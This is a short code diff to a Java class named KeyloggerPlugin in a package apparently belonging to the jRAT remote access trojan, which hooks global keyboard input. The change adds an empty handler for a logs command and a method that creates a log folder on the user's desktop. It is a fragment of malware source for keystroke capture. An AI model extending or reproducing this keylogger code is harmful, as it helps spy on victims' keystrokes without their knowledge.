@@ -3,6 +3,7 @@ package pro.jrat.plugin.stub;
 import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.InputStreamReader;
 
 import org.jnativehook.GlobalScreen;
@@ -51,6 +52,8 @@ public class KeyloggerPlugin extends StubPlugin {
 					e.printStackTrace();
 				}
 			}
+		} else if (header == LOGS_HEADER) {
+			
 		}
 	}
 
@@ -103,5 +106,11 @@ public class KeyloggerPlugin extends StubPlugin {
 			}
 
 		}));
+	}
+	
+	public static File getLogsRoot() {
+		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
+		file.mkdirs();
+		return file;
 	}
 }
